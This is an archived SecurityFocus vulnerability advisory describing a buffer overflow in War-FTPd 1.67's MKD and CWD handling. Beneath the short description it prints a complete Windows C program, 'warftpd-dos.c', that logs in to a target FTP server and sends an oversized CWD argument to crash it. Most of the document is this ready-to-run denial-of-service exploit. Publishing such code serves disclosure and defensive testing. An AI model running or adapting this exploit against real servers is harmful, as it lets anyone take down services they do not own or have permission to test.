source: http://www.securityfocus.com/bid/966/info

War-FTPd 1.67 and possibly previous versions are susceptible to a buffer overflow DoS attack.

Due to improper bounds checking in the code that handles MKD and CWD commands, it is possible to remotely crash the server by submitting extremely long pathnames as arguments to either command. 

/*--------------------------------------------------------------*/
/* war-ftpd 1.66x4s and 1.67-3 DoS sample by crc "warftpd-dos.c"*/
/*--------------------------------------------------------------*/

#include    <stdio.h>
#include    <string.h>
#include    <winsock.h>
#include    <windows.h>

#define     FTP_PORT        21
#define     MAXBUF          8182
//#define     MAXBUF          553
#define     MAXPACKETBUF    32000
#define     NOP             0x90

void main(int argc,char *argv[])
{
    SOCKET               sock;
    unsigned long        victimaddr;
    SOCKADDR_IN          victimsockaddr;
    WORD                 wVersionRequested;
    int                  nErrorStatus;
    static unsigned char buf[MAXBUF],packetbuf[MAXPACKETBUF],*q;
    hostent              *victimhostent;
    WSADATA              wsa;

    if (argc < 3){
        printf("Usage: %s TargetHost UserName Password\n",argv[0]); exit(1);
    }

    wVersionRequested = MAKEWORD(1, 1);
    nErrorStatus = WSAStartup(wVersionRequested, &wsa);
    if (atexit((void (*)(void))(WSACleanup))) {
        fprintf(stderr,"atexit(WSACleanup)failed\n"); exit(-1);
    }

    if ( nErrorStatus != 0 ) {
        fprintf(stderr,"Winsock Initialization failed\n"); exit(-1);
    }

    if ((sock=socket(AF_INET,SOCK_STREAM,0))==INVALID_SOCKET){
        fprintf(stderr,"Can't create socket.\n"); exit(-1);
    }


    victimaddr = inet_addr((char*)argv[1]);
    if (victimaddr == -1) {
        victimhostent = gethostbyname(argv[1]);
        if (victimhostent == NULL) {
            fprintf(stderr,"Can't resolve specified host.\n"); exit(-1);
        }
        else
            victimaddr = *((unsigned long *)((victimhostent->h_addr_list)[0]));
    }

    victimsockaddr.sin_family        = AF_INET;
    victimsockaddr.sin_addr.s_addr  = victimaddr;
    victimsockaddr.sin_port  = htons((unsigned short)FTP_PORT);
    memset(victimsockaddr.sin_zero,(int)0,sizeof(victimsockaddr.sin_zero));

    if(connect(sock,(struct sockaddr *)&victimsockaddr,sizeof(victimsockaddr)) == SOCKET_ERROR){
        fprintf(stderr,"Connection refused.\n"); exit(-1);
    }

    printf("Attacking war-ftpd ...\n");
    recv(sock,(char *)packetbuf,MAXPACKETBUF,0);
    sprintf((char *)packetbuf,"USER %s\r\n",argv[2]);
    send(sock,(char *)packetbuf,strlen((char *)packetbuf),0);
    recv(sock,(char *)packetbuf,MAXPACKETBUF,0);
    sprintf((char *)packetbuf,"PASS %s\r\n",argv[3]);
    send(sock,(char *)packetbuf,strlen((char *)packetbuf),0);
    recv(sock,(char *)packetbuf,MAXPACKETBUF,0);

    memset(buf,NOP,MAXBUF); buf[MAXBUF-1]=0;

    sprintf((char *)packetbuf,"CWD %s\r\n",buf);
    send(sock,(char *)packetbuf,strlen((char *)packetbuf),0);

    Sleep(100);
    shutdown(sock, 2);
    closesocket(sock);
    WSACleanup();
    printf("done.\n");
}
